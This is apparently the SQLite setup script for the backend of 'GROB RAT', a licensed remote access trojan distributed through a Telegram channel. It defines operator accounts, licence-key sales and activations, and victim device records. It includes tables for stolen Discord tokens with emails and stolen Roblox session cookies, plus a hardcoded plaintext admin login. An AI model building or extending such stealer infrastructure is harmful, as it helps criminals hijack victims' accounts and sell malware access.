-- t.me/SentinelLinks

-- Initialize SQLite database for GROB RAT
-- Run this first to create all tables

-- t.me/SentinelLinks
-- Users table
CREATE TABLE IF NOT EXISTS users (
  id TEXT PRIMARY KEY,
  username TEXT UNIQUE NOT NULL,
  password TEXT NOT NULL,
  is_admin INTEGER DEFAULT 0,
  created_at TEXT DEFAULT CURRENT_TIMESTAMP,
  license_key TEXT,
  license_expiry TEXT,
  uid TEXT UNIQUE NOT NULL,
  blocked INTEGER DEFAULT 0
);

-- License keys table
CREATE TABLE IF NOT EXISTS license_keys (
  id TEXT PRIMARY KEY,
  key TEXT UNIQUE NOT NULL,
  created_by TEXT NOT NULL,
  created_at TEXT DEFAULT CURRENT_TIMESTAMP,
  duration TEXT NOT NULL,
  max_activations INTEGER NOT NULL,
  activations INTEGER DEFAULT 0,
  is_active INTEGER DEFAULT 1,
  FOREIGN KEY (created_by) REFERENCES users(id)
);

-- License activations table
CREATE TABLE IF NOT EXISTS license_activations (
  id TEXT PRIMARY KEY,
  license_id TEXT NOT NULL,
  user_id TEXT NOT NULL,
  activated_at TEXT DEFAULT CURRENT_TIMESTAMP,
  FOREIGN KEY (license_id) REFERENCES license_keys(id),
  FOREIGN KEY (user_id) REFERENCES users(id),
  UNIQUE(license_id, user_id)
);

-- Device owners table (links HWID to user UID)
CREATE TABLE IF NOT EXISTS device_owners (
  device_id TEXT PRIMARY KEY,
  user_uid TEXT NOT NULL,
  created_at TEXT DEFAULT CURRENT_TIMESTAMP,
  FOREIGN KEY (user_uid) REFERENCES users(uid)
);

-- Stealer data table (Discord tokens)
CREATE TABLE IF NOT EXISTS stealer_discord (
  id TEXT PRIMARY KEY,
  user_uid TEXT NOT NULL,
  device_id TEXT NOT NULL,
  token TEXT NOT NULL,
  username TEXT,
  display_name TEXT,
  email TEXT,
  user_id TEXT,
  created_at TEXT DEFAULT CURRENT_TIMESTAMP,
  FOREIGN KEY (user_uid) REFERENCES users(uid)
);

-- t.me/SentinelLinks
-- Stealer data table (Roblox cookies)
CREATE TABLE IF NOT EXISTS stealer_roblox (
  id TEXT PRIMARY KEY,
  user_uid TEXT NOT NULL,
  device_id TEXT NOT NULL,
  cookie TEXT NOT NULL,
  username TEXT,
  roblox_id TEXT,
  created_at TEXT DEFAULT CURRENT_TIMESTAMP,
  FOREIGN KEY (user_uid) REFERENCES users(uid)
);

-- Insert default admin
INSERT OR IGNORE INTO users (id, username, password, is_admin, uid, license_key, license_expiry)
VALUES ('admin-001', 'ORIXMAN', '180886', 1, 'admin-uid-001', 'ADMIN-PERMANENT', 'forever');

-- t.me/SentinelLinks
--  ____             _   _            _
-- / ___|  ___ _  | |_(_)_    ___| |   
-- \___ \ / _ \ '_ \| | | '_ \ / _ \ | 
--  ___) |  / | | | |_| | | | |  / |   
-- |____/ \___|_| |_|\|_|_| |_|\___|_| 
-- ********************************    
